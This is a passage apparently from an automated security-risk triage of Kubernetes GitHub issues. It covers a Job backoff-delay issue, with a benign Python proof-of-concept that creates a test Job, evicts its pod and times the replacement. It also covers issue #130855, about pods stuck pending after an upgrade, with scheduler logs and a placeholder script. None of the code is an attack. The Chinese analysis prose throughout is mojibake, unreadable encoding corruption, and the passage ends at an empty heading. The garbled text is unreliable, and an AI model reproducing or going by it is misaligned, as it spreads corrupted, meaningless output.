1.  **é—®é¢˜æ€§è´¨**ï¼šè¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ Job æ§åˆ¶å™¨è°ƒåº¦é€»è¾‘å’Œ `podFailurePolicy` äº¤äº’çš„ä¸€ä¸ªåŠŸèƒ½æ€§é—®é¢˜æˆ–é¢„æœŸä¸ç¬¦çš„è¡Œä¸ºï¼Œè€Œéå…¸å‹çš„å®‰å…¨æ¼æ´ã€‚å®ƒå½±å“çš„æ˜¯ Job Pod å› ç‰¹å®šä¸­æ–­ï¼ˆå¦‚èŠ‚ç‚¹é©±é€ï¼‰åçš„æ¢å¤é€Ÿåº¦ã€‚
2.  **å½±å“èŒƒå›´**ï¼šå½±å“çš„æ˜¯è®¾ç½®äº†ç‰¹å®š `podFailurePolicy` çš„ Job çš„ Pod é‡å»ºå»¶è¿Ÿã€‚å®ƒä¸ä¼šå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€æƒé™æå‡ã€è¿œç¨‹ä»£ç æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰é«˜å±å®‰å…¨é£é™©ã€‚
3.  **è§¦å‘æ¡ä»¶**ï¼šè¦è§¦å‘è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦å‘ç”Ÿ Pod é©±é€äº‹ä»¶ï¼ˆä¾‹å¦‚é€šè¿‡ `kubectl drain` æˆ– Eviction APIï¼‰ã€‚æ‰§è¡Œè¿™äº›æ“ä½œé€šå¸¸éœ€è¦è¾ƒé«˜çš„ Kubernetes é›†ç¾¤æƒé™ï¼ˆå¦‚é›†ç¾¤ç®¡ç†å‘˜æˆ–å…·æœ‰ç‰¹å®šå‘½åç©ºé—´å†… Pod ç®¡ç†æƒé™çš„ç”¨æˆ·ï¼‰ã€‚
4.  **æ½œåœ¨çš„ DoS**ï¼Ÿï¼šå¯ä»¥è®¤ä¸ºè¿™æ˜¯ä¸€ç§é’ˆå¯¹ç‰¹å®š Job çš„å¯ç”¨æ€§å½±å“æˆ–è½»å¾®çš„ DoSï¼Œå› ä¸º Pod çš„æ¢å¤æ¯”é¢„æœŸçš„è¦æ…¢ã€‚ä½†æ˜¯ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡† 5ï¼Œç”±äºè§¦å‘æ­¤è¡Œä¸ºï¼ˆPod é©±é€ï¼‰é€šå¸¸éœ€è¦éåªè¯»æƒé™ï¼ˆå¦‚ `pods/evict` æƒé™æˆ–èŠ‚ç‚¹ç®¡ç†æƒé™ï¼‰ï¼Œå¹¶ä¸”å½±å“çš„æ˜¯ Job è‡ªèº«çš„æ¢å¤æ—¶é—´ï¼Œè€Œä¸æ˜¯å¯¼è‡´æ•´ä¸ªé›†ç¾¤æˆ–å…³é”®æœåŠ¡ä¸å¯ç”¨ï¼Œå› æ­¤ä¸åº”è¢«è¯„ä¸ºé«˜é£é™©ã€‚æ”»å‡»è€…å³ä½¿æœ‰æƒé™é©±é€ Podï¼Œä¹Ÿåªæ˜¯å»¶è¿Ÿäº†è¯¥ Job çš„ Pod å¯åŠ¨ï¼Œå¹¶æœªè·å¾—é¢å¤–çš„æƒé™æˆ–ä¿¡æ¯ã€‚
5.  **å¤šç”¨æˆ·åœºæ™¯**ï¼šåœ¨ä¸€ä¸ªå¤šç”¨æˆ·ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªç”¨æˆ·ï¼ˆå¦‚æœæ‹¥æœ‰è¶³å¤Ÿæƒé™ï¼‰å¯ä»¥é€šè¿‡é©±é€å…¶è‡ªå·±æˆ–å…¶ä»–ç”¨æˆ·çš„ Pod æ¥è§¦å‘è¿™ä¸ªå»¶è¿Ÿã€‚ç„¶è€Œï¼Œè¿™å¹¶ä¸èƒ½è®©ä»–è®¿é—®å…¶ä»–ç”¨æˆ·çš„æ•°æ®æˆ–èµ„æºï¼Œåªæ˜¯å»¶è¿Ÿäº†å—å½±å“ Job çš„æ‰§è¡Œã€‚æ ¹æ®æ ‡å‡† 8ï¼Œè™½ç„¶èƒ½å½±å“å…¶ä»–ç”¨æˆ·ï¼ˆå¦‚æœæƒé™è¶³å¤Ÿï¼‰ï¼Œä½†å½±å“çš„æ€§è´¨ï¼ˆå»¶è¿Ÿ Pod å¯åŠ¨ï¼‰ä¸å±äºé«˜å±å½±å“ï¼ˆå¦‚å‘½ä»¤æ‰§è¡Œã€æ•°æ®çªƒå–ï¼‰ã€‚

**ç»“è®º**ï¼šè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é—®é¢˜ï¼Œå¯¼è‡´ Job Pod åœ¨ç‰¹å®šé©±é€åœºæ™¯ä¸‹æ¢å¤å»¶è¿Ÿè¶…å‡ºé¢„æœŸã€‚è™½ç„¶è¿™å¯èƒ½å½±å“ Job çš„å¯ç”¨æ€§ï¼Œä½†è§¦å‘æ¡ä»¶éœ€è¦ç‰¹å®šæƒé™ï¼Œä¸”å½±å“æœ‰é™ï¼Œä¸æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€æƒé™æå‡æˆ–ä»£ç æ‰§è¡Œç­‰ä¸¥é‡å®‰å…¨åæœã€‚å› æ­¤ï¼Œä¸å°†å…¶å½’ç±»ä¸ºå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import yaml
from kubernetes import client, config
from kubernetes.client.rest import ApiException
import datetime
import sys
import threading

# Constants
NAMESPACE = "default"
JOB_NAME = "test-job-backoff-poc"
POD_LABEL_SELECTOR = f"job-name={JOB_NAME}"
JOB_YAML = f"""
apiVersion: batch/v1
kind: Job
metadata:
  name: {JOB_NAME}
spec:
  parallelism: 3 # Use a smaller parallelism for easier observation
  completions: 3
  podFailurePolicy:
    rules:
      - action: Ignore
        onPodConditions:
        - type: DisruptionTarget
  template:
    spec:
      containers:
      - name: pause
        # Using a common image that just pauses
        image: registry.k8s.io/pause:3.6
        resources:
          requests:
            cpu: 100m # Requesting minimal resources
      restartPolicy: Never
  backoffLimit: 4
"""
MAX_WAIT_SECONDS = 120 # 2 minutes overall timeout

# --- Main Function ---
def run_poc():
    """Runs the proof-of-concept to demonstrate the backoff delay issue."""
    global end_time
    end_time = time.time() + MAX_WAIT_SECONDS
    print(f"Starting POC for Issue: Job backoff delay increase with Ignore action. Max duration: {MAX_WAIT_SECONDS} seconds.")

    api_client = None
    try:
        # 1. Load Kubernetes configuration (assumes default location)
        print("Loading Kubernetes configuration...")
        try:
            config.load_kube_config()
            api_client = client.ApiClient()
        except Exception as e:
            print(f"Error loading Kubernetes configuration: {e}", file=sys.stderr)
            print("Ensure KUBECONFIG is set or ~/.kube/config exists and is valid.", file=sys.stderr)
            return

        batch_v1 = client.BatchV1Api(api_client)
        core_v1 = client.CoreV1Api(api_client)

        # 2. Define and create the Job
        print(f"Creating Job '{JOB_NAME}' in namespace '{NAMESPACE}'...")
        job_body = yaml.safe_load(JOB_YAML)
        try:
            batch_v1.create_namespaced_job(body=job_body, namespace=NAMESPACE)
            print(f"Job '{JOB_NAME}' created.")
        except ApiException as e:
            if e.status == 409: # Already exists
                 print(f"Job '{JOB_NAME}' already exists. Proceeding...")
                 # Optional: Clean up existing job first if needed
                 # print(f"Deleting existing job '{JOB_NAME}'...")
                 # try:
                 #     batch_v1.delete_namespaced_job(JOB_NAME, NAMESPACE, propagation_policy='Background')
                 #     time.sleep(5) # Give it time to delete
                 #     batch_v1.create_namespaced_job(body=job_body, namespace=NAMESPACE)
                 #     print(f"Job '{JOB_NAME}' recreated.")
                 # except ApiException as delete_e:
                 #     print(f"Error deleting existing job: {delete_e}", file=sys.stderr)
                 #     return
            else:
                print(f"Error creating Job: {e}", file=sys.stderr)
                return
        except Exception as e:
             print(f"An unexpected error occurred during job creation: {e}", file=sys.stderr)
             return

        # 3. Wait for at least one pod to be running
        print(f"Waiting for at least one pod of Job '{JOB_NAME}' to be Running...")
        running_pod_name = wait_for_running_pod(core_v1)
        if not running_pod_name:
            print("Timed out waiting for a running pod.", file=sys.stderr)
            return # Cleanup will be handled in finally
        print(f"Pod '{running_pod_name}' is Running.")

        # 4. Evict the running pod
        print(f"Evicting pod '{running_pod_name}'...")
        eviction_body = client.V1Eviction(
            metadata=client.V1ObjectMeta(name=running_pod_name, namespace=NAMESPACE),
            delete_options=client.V1DeleteOptions(grace_period_seconds=0) # Force immediate attempt
        )
        try:
            core_v1.create_namespaced_pod_eviction(name=running_pod_name, namespace=NAMESPACE, body=eviction_body)
            print(f"Eviction request sent for pod '{running_pod_name}'.")
            eviction_time = datetime.datetime.now(datetime.timezone.utc)
        except ApiException as e:
            # Handle cases where eviction might fail (e.g., PDB prevents it, pod already terminating)
            if e.status == 404:
                 print(f"Pod '{running_pod_name}' not found, might have terminated already. Cannot evict.", file=sys.stderr)
                 # Might need to select another pod or abort if none are suitable
                 return
            elif e.status == 429: # Too Many Requests - often due to PDB
                 print(f"Eviction failed for pod '{running_pod_name}', possibly due to PodDisruptionBudget. Error: {e}", file=sys.stderr)
                 # This might prevent demonstrating the issue, depending on PDB settings.
                 return
            else:
                print(f"Error evicting pod: {e}", file=sys.stderr)
                return
        except Exception as e:
            print(f"An unexpected error occurred during eviction: {e}", file=sys.stderr)
            return

        # 5. Monitor for new pod creation and measure delay
        print("Monitoring for replacement pod creation...")
        replacement_pod_info = wait_for_new_pod(core_v1, eviction_time)

        if replacement_pod_info:
            new_pod_name, creation_timestamp = replacement_pod_info
            # Timestamps are timezone-aware UTC from K8s API
            delay = creation_timestamp - eviction_time
            print(f"Replacement pod '{new_pod_name}' created at {creation_timestamp.isoformat()}.")
            print(f"Observed delay between eviction request and new pod creation: {delay.total_seconds():.2f} seconds.")
            # Default exponential backoff starts at 10s. If Ignore *prevented* backoff increase,
            # the delay should be very short (scheduling latency). If it *doesn't* prevent it,
            # the delay should be >= 10 seconds.
            if delay.total_seconds() >= 9: # Allowing slight timing variations
                print("Finding: Delay observed is consistent with backoff delay being applied despite 'Ignore' action (>= 10s expected for first failure).")
                print("This demonstrates the behavior described in the issue.")
            else:
                print(f"Finding: Delay observed ({delay.total_seconds():.2f}s) is shorter than the expected initial backoff (10s).")
                print("This might indicate the backoff was *not* significantly applied, or scheduling was very fast.")
                print("Re-run or check cluster conditions if behavior deviates from the issue report.")
        else:
            print("Timed out waiting for a replacement pod to be created.", file=sys.stderr)


    except Exception as e:
        print(f"An unexpected error occurred during POC execution: {e}", file=sys.stderr)
    finally:
        # 6. Cleanup
        print(f"Cleaning up Job '{JOB_NAME}'...")
        if api_client: # Ensure API client was initialized
            try:
                batch_v1 = client.BatchV1Api(api_client)
                batch_v1.delete_namespaced_job(
                    name=JOB_NAME,
                    namespace=NAMESPACE,
                    body=client.V1DeleteOptions(propagation_policy='Background') # Delete pods too
                )
                print(f"Job '{JOB_NAME}' deletion requested.")
            except ApiException as e:
                 # Avoid erroring out if cleanup fails (e.g., job already gone)
                 if e.status == 404:
                     print(f"Job '{JOB_NAME}' not found during cleanup.")
                 else:
                     print(f"Error cleaning up Job '{JOB_NAME}': {e}", file=sys.stderr)
            except NameError:
                 # batch_v1 might not be defined if config loading failed
                 print("Cleanup skipped as API client wasn't fully initialized.")
            except Exception as e:
                 print(f"An unexpected error occurred during cleanup: {e}", file=sys.stderr)
        else:
            print("Cleanup skipped as Kubernetes config could not be loaded.")
        print("POC finished.")

# --- Helper Functions ---
def check_timeout():
    """Checks if the maximum execution time has been exceeded."""
    if time.time() > end_time:
        raise TimeoutError("Maximum execution time reached")

def wait_for_running_pod(core_v1_api):
    """Waits for a pod belonging to the job to reach the Running state."""
    print(f"Waiting for a pod with label '{POD_LABEL_SELECTOR}' to be Running...")
    start_wait = time.time()
    while True:
        check_timeout()
        try:
            pods = core_v1_api.list_namespaced_pod(
                namespace=NAMESPACE,
                label_selector=POD_LABEL_SELECTOR
            )
            for pod in pods.items:
                # Check if pod is in a state that is considered 'running' enough for eviction test
                # Needs to be assigned to a node and ideally Running, but Pending might be ok if scheduled
                if pod.status and pod.status.phase == 'Running':
                     print(f"Found running pod: {pod.metadata.name}")
                     return pod.metadata.name
                # Add check for Pending but scheduled? Maybe not necessary for this POC.
                # elif pod.status and pod.status.phase == 'Pending' and pod.spec.node_name:
                #     print(f"Found scheduled (Pending) pod: {pod.metadata.name}")
                #     return pod.metadata.name

            print(f"No running pod found yet. Retrying... (Elapsed: {time.time() - start_wait:.1f}s)")
            time.sleep(5) # Wait before polling again

        except ApiException as e:
            print(f"Error listing pods: {e}. Retrying...", file=sys.stderr)
            time.sleep(5)
        except Exception as e:
            print(f"An unexpected error occurred waiting for running pod: {e}. Aborting wait.", file=sys.stderr)
            return None # Indicate failure

def wait_for_new_pod(core_v1_api, eviction_timestamp_utc):
    """Waits for a *new* pod (created after eviction) belonging to the job."""
    print(f"Waiting for a new pod created after {eviction_timestamp_utc.isoformat()}...")
    start_wait = time.time()
    # Give K8s some time to react before starting the check
    time.sleep(2)

    while True:
        check_timeout()
        try:
            pods = core_v1_api.list_namespaced_pod(
                namespace=NAMESPACE,
                label_selector=POD_LABEL_SELECTOR
            )
            for pod in pods.items:
                if pod.metadata.creation_timestamp > eviction_timestamp_utc:
                    # Found a pod created *after* the eviction timestamp
                    print(f"Found new pod: {pod.metadata.name} created at {pod.metadata.creation_timestamp.isoformat()}")
                    return pod.metadata.name, pod.metadata.creation_timestamp # Return name and creation time

            print(f"No new pod found yet. Retrying... (Elapsed: {time.time() - start_wait:.1f}s)")
            time.sleep(5)

        except ApiException as e:
            print(f"Error listing pods: {e}. Retrying...", file=sys.stderr)
            time.sleep(5)
        except Exception as e:
            print(f"An unexpected error occurred waiting for new pod: {e}. Aborting wait.", file=sys.stderr)
            return None # Indicate failure


# --- Timeout Handling & Execution ---
end_time = 0 # Initialize globally

# Execute the main function
run_poc()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Python è„šæœ¬ä½¿ç”¨ `kubernetes` å®¢æˆ·ç«¯åº“æ¥æ¨¡æ‹Ÿå’Œè§‚å¯Ÿ Issue ä¸­æè¿°çš„è¡Œä¸ºã€‚

1.  **ç¯å¢ƒå‡è®¾**: è„šæœ¬å‡è®¾ç”¨æˆ·å·²é…ç½®å¥½ `kubectl` ç¯å¢ƒï¼Œå¹¶ä¸” Python ç¯å¢ƒä¸­å®‰è£…äº† `kubernetes` åº“ (`pip install kubernetes`)ã€‚å®ƒä¼šå°è¯•ä»é»˜è®¤ä½ç½® (`~/.kube/config` æˆ– KUBECONFIG ç¯å¢ƒå˜é‡) åŠ è½½ Kubernetes é…ç½®ã€‚
2.  **Job å®šä¹‰**: è„šæœ¬å†…å®šä¹‰äº†ä¸€ä¸ªä¸ Issue ä¸­ç±»ä¼¼çš„ Kubernetes Job YAML å­—ç¬¦ä¸²ï¼ŒåŒ…å« `podFailurePolicy`ï¼Œè®¾ç½®äº†å¯¹ `DisruptionTarget` æ¡ä»¶æ‰§è¡Œ `Ignore` æ“ä½œã€‚
3.  **åˆ›å»º Job**: ä½¿ç”¨ `BatchV1Api` åœ¨ç›®æ ‡é›†ç¾¤çš„ `default` å‘½åç©ºé—´ä¸­åˆ›å»ºè¿™ä¸ª Jobã€‚
4.  **ç­‰å¾… Pod è¿è¡Œ**: ä½¿ç”¨ `CoreV1Api` è½®è¯¢æŸ¥æ‰¾å±äºè¯¥ Job ä¸”çŠ¶æ€ä¸º `Running` çš„ Podã€‚è®¾ç½®äº†è¶…æ—¶æœºåˆ¶ã€‚
5.  **é©±é€ Pod**: ä¸€æ—¦æ‰¾åˆ°è¿è¡Œä¸­çš„ Podï¼Œè„šæœ¬ä½¿ç”¨ `CoreV1Api` çš„ `create_namespaced_pod_eviction` æ–¹æ³•å‘é€é©±é€è¯·æ±‚ï¼Œæ¨¡æ‹Ÿ `kubectl drain` æˆ–ç±»ä¼¼æ“ä½œå¯¼è‡´ Pod è¢«æ ‡è®°ä¸ºä¸­æ–­ç›®æ ‡çš„æƒ…å†µã€‚è®°å½•é©±é€è¯·æ±‚å‘é€çš„æ—¶é—´ç‚¹ã€‚
6.  **ç›‘æ§æ–° Pod åˆ›å»º**: è„šæœ¬æ¥ç€è½®è¯¢ Pod åˆ—è¡¨ï¼ŒæŸ¥æ‰¾ä¸€ä¸ªå±äºè¯¥ Job ä¸”åˆ›å»ºæ—¶é—´æˆ³æ™šäºé©±é€è¯·æ±‚æ—¶é—´æˆ³çš„æ–° Podã€‚
7.  **è®¡ç®—å»¶è¿Ÿ**: å¦‚æœæ‰¾åˆ°æ–°çš„ Podï¼Œè„šæœ¬ä¼šè®¡ç®—ä»å‘é€é©±é€è¯·æ±‚åˆ°æ–° Pod è¢«åˆ›å»ºä¹‹é—´çš„æ—¶é—´å·®ã€‚
8.  **ç»“æœåˆ†æ**: è„šæœ¬ä¼šæ‰“å°è§‚å¯Ÿåˆ°çš„å»¶è¿Ÿã€‚æ ¹æ® Issue çš„æè¿°ï¼Œé¢„æœŸè¿™ä¸ªå»¶è¿Ÿä¼šå¤§äºç­‰äº Kubernetes é»˜è®¤çš„åˆå§‹ Job Pod é€€é¿å»¶è¿Ÿï¼ˆé€šå¸¸æ˜¯ 10 ç§’ï¼‰ï¼Œå³ä½¿ `podFailurePolicy` è®¾ç½®äº† `Ignore`ã€‚è„šæœ¬ä¼šæ ¹æ®è§‚å¯Ÿåˆ°çš„å»¶è¿Ÿæ—¶é—´æ‰“å°ä¸€ä¸ªç»“è®ºï¼Œè¯´æ˜è§‚å¯Ÿç»“æœæ˜¯å¦ä¸ Issue æè¿°çš„è¡Œä¸ºä¸€è‡´ã€‚
9.  **èµ„æºæ¸…ç†**: ä½¿ç”¨ `finally` å—ç¡®ä¿æ— è®ºè„šæœ¬æ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå°è¯•åˆ é™¤åˆ›å»ºçš„ Job åŠå…¶å…³è”çš„ Podã€‚
10. **è¶…æ—¶æ§åˆ¶**: è„šæœ¬åŒ…å«ä¸€ä¸ªå…¨å±€è¶…æ—¶ (`MAX_WAIT_SECONDS`)ï¼Œé˜²æ­¢æ— é™æœŸè¿è¡Œï¼Œå¹¶åœ¨ç­‰å¾…å¾ªç¯ä¸­æ£€æŸ¥æ˜¯å¦è¶…æ—¶ã€‚

**é‡è¦æç¤º**: æ­¤è„šæœ¬æ—¨åœ¨æœ¬åœ°æˆ–æµ‹è¯•ç¯å¢ƒä¸­**æ¼”ç¤º** Issue ä¸­æè¿°çš„ Kubernetes è¡Œä¸ºï¼Œç¡®è®¤ `Ignore` action å¯¹ `DisruptionTarget` æ˜¯å¦ä¼šè§¦å‘ Backoff Delayã€‚å®ƒæœ¬èº«**ä¸æ˜¯**ä¸€ä¸ªåˆ©ç”¨å®‰å…¨æ¼æ´çš„è„šæœ¬ï¼Œå› ä¸ºæ‰€æè¿°çš„é—®é¢˜å¹¶éå®‰å…¨æ¼æ´ã€‚è¿è¡Œæ­¤è„šæœ¬éœ€è¦å¯¹ç›®æ ‡ Kubernetes é›†ç¾¤å…·æœ‰åˆ›å»º Jobã€åˆ—å‡º/é©±é€ Pod çš„æƒé™ã€‚

---


## Issue #130855 Scheduling problem after upgrade: Pods are created, Containers pending indefinitely

- Issue é“¾æ¥ï¼š[#130855](https://github.com/kubernetes/kubernetes/issues/130855)

### Issue å†…å®¹

I have made a simple patch upgrade from 1.31.4 to 1.31.7, as well as patch upgrades to Containerd, Cuda and drivers & container toolkit.

The cluster is comprised of seven nodes: 1 control plane, 2 storage servers and 4 workers with A100 GPUs.

Now all of a sudden, I have a very strange situation when scheduling nodes on the workers (only on them, others work fine). If a pod is scheduled, it will start normally on one node, but on all others it will merely be created, but never gets any containers, no events, nothing for hours.

Now I noticed that while the pod is pending, I just need to restart the kubelet on the node it is pending on and its containers will be created and it will start up fine.

I am completely stumped as to how to debug this properly, as I cannot find any clues in the logs. Containerd never seems to notice about the pod's containers, so there is no message there and I can't find the reason in the scheduler log.

This is what the scheduler produces when it does not create the containers:

```
I0316 17:27:20.579516       1 eventhandlers.go:149] "Add event for unscheduled pod" pod="jupyterhub/static-web"
I0316 17:27:20.579594       1 schedule_one.go:83] "About to try and schedule pod" pod="jupyterhub/static-web"
I0316 17:27:20.579607       1 schedule_one.go:96] "Attempting to schedule pod" pod="jupyterhub/static-web"
I0316 17:27:20.580265       1 default_binder.go:53] "Attempting to bind pod to node" logger="Bind.DefaultBinder" pod="jupyterhub/static-web" node="work-e"
I0316 17:27:20.583527       1 schedule_one.go:314] "Successfully bound pod to node" pod="jupyterhub/static-web" node="work-e" evaluatedNodes=6 feasibleNodes=1
I0316 17:27:20.583561       1 eventhandlers.go:231] "Add event for scheduled pod" pod="jupyterhub/static-web"
I0316 17:27:20.583546       1 eventhandlers.go:201] "Delete event for unscheduled pod" pod="jupyterhub/static-web"
```

After a restart, it continues:
```
I0316 17:28:26.776334       1 eventhandlers.go:99] "Update event for node" node="work-e"
I0316 17:28:28.117177       1 eventhandlers.go:268] "Update event for scheduled pod" pod="jupyterhub/static-web"
I0316 17:28:29.991015       1 reflector.go:871] k8s.io/client-go/informers/factory.go:160: Watch close - *v1.ReplicationController total 6 items received
I0316 17:28:30.341939       1 eventhandlers.go:268] "Update event for scheduled pod" pod="jupyterhub/static-web"
```

Does anyone have an idea where to look for why the containers are never started?

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ªåœ¨ Kubernetes é›†ç¾¤å‡çº§ï¼ˆKubernetes ç‰ˆæœ¬ã€Containerdã€Cuda é©±åŠ¨ç­‰ï¼‰åå‡ºç°çš„è°ƒåº¦é—®é¢˜ã€‚å…·ä½“è¡¨ç°ä¸ºï¼šåœ¨æŸäº›å·¥ä½œèŠ‚ç‚¹ä¸Šï¼ˆå¸¦æœ‰ A100 GPUï¼‰ï¼Œé€šè¿‡è°ƒåº¦å™¨æˆåŠŸè°ƒåº¦å¹¶ç»‘å®šåˆ°èŠ‚ç‚¹çš„ Pod å¯ä»¥è¢«åˆ›å»ºï¼Œä½†å…¶å®¹å™¨é•¿æ—¶é—´å¤„äº Pending çŠ¶æ€ï¼Œæ— æ³•æ­£å¸¸å¯åŠ¨ã€‚é‡å¯è¯¥èŠ‚ç‚¹ä¸Šçš„ `kubelet` æœåŠ¡åï¼Œå¯¹åº”çš„ Pod å®¹å™¨æ‰èƒ½è¢«åˆ›å»ºå¹¶å¯åŠ¨ã€‚

1.  **é—®é¢˜æ€§è´¨**ï¼šè¿™çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bug æˆ–å…¼å®¹æ€§é—®é¢˜ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå…¸å‹çš„å®‰å…¨æ¼æ´ã€‚é—®é¢˜æ ¸å¿ƒåœ¨äº `kubelet` åœ¨ Pod è¢«è°ƒåº¦åˆ°èŠ‚ç‚¹åï¼Œæœªèƒ½æ­£ç¡®åœ°ä¸å®¹å™¨è¿è¡Œæ—¶ï¼ˆContainerdï¼‰äº¤äº’ä»¥å¯åŠ¨å®¹å™¨ï¼Œç›´åˆ° `kubelet` é‡å¯ã€‚
2.  **æ½œåœ¨å½±å“**ï¼šä¸»è¦å½±å“æ˜¯**å¯ç”¨æ€§ (Availability)**ã€‚è¢«è°ƒåº¦åˆ°å—å½±å“èŠ‚ç‚¹ä¸Šçš„ Pod æ— æ³•è¿è¡Œï¼Œå¯¼è‡´ä¾èµ–è¿™äº› Pod çš„æœåŠ¡ä¸­æ–­æˆ–å»¶è¿Ÿã€‚è¿™å¯ä»¥è¢«è§†ä¸ºä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰çŠ¶æ€ï¼Œä½†å®ƒæ˜¯ç”±ç³»ç»Ÿå†…éƒ¨çš„æ•…éšœå¼•èµ·çš„ï¼Œè€Œéå¤–éƒ¨æ”»å‡»ç›´æ¥è§¦å‘çš„æ¼æ´åˆ©ç”¨ã€‚
3.  **æ”»å‡»è€…åˆ©ç”¨å¯èƒ½**ï¼šä¸€ä¸ªæ‹¥æœ‰åœ¨é›†ç¾¤ä¸­åˆ›å»º Pod æƒé™ï¼ˆä¾‹å¦‚ï¼Œ`create pods`ï¼‰çš„ç”¨æˆ·ï¼Œå¦‚æœçŸ¥é“å“ªäº›èŠ‚ç‚¹å—æ­¤é—®é¢˜å½±å“ï¼Œå¯ä»¥æ•…æ„å°† Pod è°ƒåº¦åˆ°è¿™äº›èŠ‚ç‚¹ä¸Šï¼Œä»è€Œå¯¼è‡´è¿™äº› Pod æ— æ³•å¯åŠ¨ã€‚è¿™ä¼šæ¶ˆè€—èŠ‚ç‚¹èµ„æºï¼ˆè‡³å°‘æ˜¯ Pod å¯¹è±¡æœ¬èº«å ç”¨çš„èµ„æºï¼‰å¹¶é˜»æ­¢å…¶ä»–åˆæ³•å·¥ä½œè´Ÿè½½åœ¨è¿™äº›èŠ‚ç‚¹ä¸Šè¿è¡Œã€‚
4.  **é£é™©åˆ¤æ–­ä¾æ®ï¼ˆç»“åˆæ ‡å‡†ï¼‰**ï¼š
    *   æ ‡å‡† 2ï¼šé—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bug æˆ–é…ç½®/å…¼å®¹æ€§é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´è®¾è®¡ã€‚
    *   æ ‡å‡† 5ï¼šè™½ç„¶å¯èƒ½å¯¼è‡´ DoSï¼Œä½†è§¦å‘æ¡ä»¶ï¼ˆåˆ›å»º Podï¼‰éœ€è¦æ”»å‡»è€…å…·å¤‡éåªè¯»æƒé™ï¼ˆ`create pods`ï¼‰ã€‚è¿™ç§å› ç³»ç»Ÿæ•…éšœå¯¼è‡´çš„ã€éœ€è¦ä¸€å®šæƒé™æ‰èƒ½è§¦å‘çš„å¯ç”¨æ€§é—®é¢˜ï¼Œé€šå¸¸ä¸è¢«è¯„ä¸ºé«˜é£é™©ã€‚é‡å¯ `kubelet` (workaround) éœ€è¦æ›´é«˜çš„èŠ‚ç‚¹æˆ–é›†ç¾¤ç®¡ç†å‘˜æƒé™ã€‚
    *   æ ‡å‡† 7 & 8ï¼šé—®é¢˜æè¿°ä¸­æ²¡æœ‰è¿¹è±¡è¡¨æ˜æ­¤é—®é¢˜å¯å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒæˆ–è·¨ç”¨æˆ·/ç§Ÿæˆ·çš„ç›´æ¥æ”»å‡»ã€‚å½±å“ä¸»è¦å±€é™äº Pod æ— æ³•å¯åŠ¨ï¼Œå½±å“çš„æ˜¯è°ƒåº¦åˆ°è¯¥æ•…éšœèŠ‚ç‚¹ä¸Šçš„å·¥ä½œè´Ÿè½½çš„å¯ç”¨æ€§ã€‚
    *   æ ‡å‡† 9ï¼šä¿¡æ¯è¶³å¤Ÿåˆ¤æ–­å…¶ä¸»è¦å½±å“æ˜¯å¯ç”¨æ€§é—®é¢˜ï¼Œè€Œéé«˜å±å®‰å…¨é£é™©ã€‚

**ç»“è®º**ï¼šè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªç”±å‡çº§å¼•èµ·çš„åŠŸèƒ½æ€§é—®é¢˜ï¼Œå¯¼è‡´ Pod æ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œå½±å“äº†æœåŠ¡çš„å¯ç”¨æ€§ã€‚è™½ç„¶å…·æœ‰ DoS çš„æ•ˆæœï¼Œä½†å®ƒæºäºç³»ç»Ÿå†…éƒ¨æ•…éšœï¼Œä¸”åˆ©ç”¨ï¼ˆå¦‚æœå¯ä»¥ç§°ä¸ºåˆ©ç”¨çš„è¯ï¼‰éœ€è¦ Pod åˆ›å»ºæƒé™ï¼Œå¹¶æœªç›´æ¥å¯¼è‡´æ•°æ®æ³„éœ²ã€æƒé™æå‡æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œç­‰é«˜é£é™©åæœã€‚å› æ­¤ï¼Œæ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜ä¸å±äºéœ€è¦é«˜é£é™©è¯„çº§çš„å®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bugï¼Œè€Œéå®‰å…¨æ¼æ´ï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚
# æ ¹æ®è¦æ±‚ï¼Œä»…é’ˆå¯¹é«˜é£é™©é—®é¢˜æä¾›å¤ç°è„šæœ¬ã€‚
# æ­¤å¤„æ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚

print("è¯¥ Issue è¢«åˆ¤å®šä¸ºåŠŸèƒ½æ€§é—®é¢˜ï¼Œé£é™©è¯„çº§ä¸º 'ä¸æ¶‰åŠ'ï¼Œæ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚")

# æ¨¡æ‹Ÿä¸»æ‰§è¡Œé€»è¾‘ï¼ˆæ ¹æ®è¦æ±‚ï¼Œä¸ä½¿ç”¨ if __name__ == "__main__":ï¼‰
def main():
    print("æ‰§è¡Œå®Œæˆã€‚")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

